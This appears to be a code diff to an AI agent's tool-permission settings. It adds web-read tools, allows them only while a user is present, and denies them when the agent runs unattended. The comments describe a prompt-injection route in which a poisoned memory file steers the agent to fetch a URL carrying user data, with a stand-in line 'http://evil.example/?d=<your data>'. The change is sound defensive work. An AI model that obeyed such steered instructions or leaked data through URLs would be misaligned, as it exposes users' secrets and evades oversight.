@@ -47,6 +47,12 @@ TOOL_SENSE: dict[str, str] = {
     "shell": "shell.exec",
     "file_write": "fs.write",
     "http_post": "network.egress",
+    # ⭐ Its own sense, not `network.egress`. Tiered permissions means the user approves
+    # each new sense separately, and "may read the public web" is a different question
+    # from "may POST to an endpoint" — conflating them would force one approval to cover
+    # both. Off until the phase-1 registry is enabled.
+    "web_read": "web.read",
+    "wiki": "web.read",
 }
 
 #: Irreversible or externally-visible actions always require a human "yes", even
@@ -60,8 +66,39 @@ ALWAYS_CONFIRM: set[str] = {
 #: Scope-sensitive: heartbeat and dreaming run unattended, so anything that
 #: touches the outside world is denied outright rather than queued for a
 #: confirmation nobody is there to give.
+#: Denied unattended, but NOT confirmation-gated interactively — the deliberate
+#: exception to `UNATTENDED_DENY <= ALWAYS_CONFIRM`, and the reason it is a named set
+#: rather than a quiet omission.
+#:
+#: The invariant exists on the principle that a gate should depend on what an action
+#: DOES, not on who is watching. For these tools, who is watching is genuinely the
+#: relevant variable: fetching a public page is reversible and changes nothing anywhere,
+#: so the action itself is benign. The danger is *unobserved steering* — a poisoned
+#: memory file, retrieved once, sending `?d=<your data>` to a host the attacker reads.
+#: A present user who can SEE the fetch is the control; a confirmation dialog per page
+#: would make the tool unusable, and an unusable safety feature gets disabled.
+#:
+#: That argument only holds if the fetch is actually visible, so it is enforced rather
+#: than assumed: `cli._announce_egress` and `serve._describe_tool` surface every egress
+#: call by DEFAULT, not under --verbose, and tests assert it. Presence without
+#: observability would just be a person in the room.
+PRESENCE_GATED: set[str] = {"web_read", "wiki"}
+
 UNATTENDED_DENY: set[str] = {
     "email_send", "shell", "http_post", "file_write", "calendar_write",
+    # ⚠️ These are READ tools, and they are still here. That is not an oversight.
+    #
+    # A URL is an outbound channel: `http://evil.example/?d=<your data>` leaves the
+    # machine as a request, and the attacker reads it from their own access log. Nothing
+    # is POSTed, nothing is written, no form is filled — and the secret is still gone.
+    # `security/injection.py` already classifies exactly this shape as `exfil_channel`.
+    #
+    # The SSRF guard stops the request going somewhere INTERNAL. It cannot stop the
+    # request carrying something outward to a public host, because that is what reading
+    # the web looks like. Interactive scope is fine: the user is present, the ledger
+    # shows the fetch, and they can object. Unattended scope has nobody watching, and a
+    # poisoned memory file only has to be retrieved once.
+    "web_read", "wiki",
 }
 
 
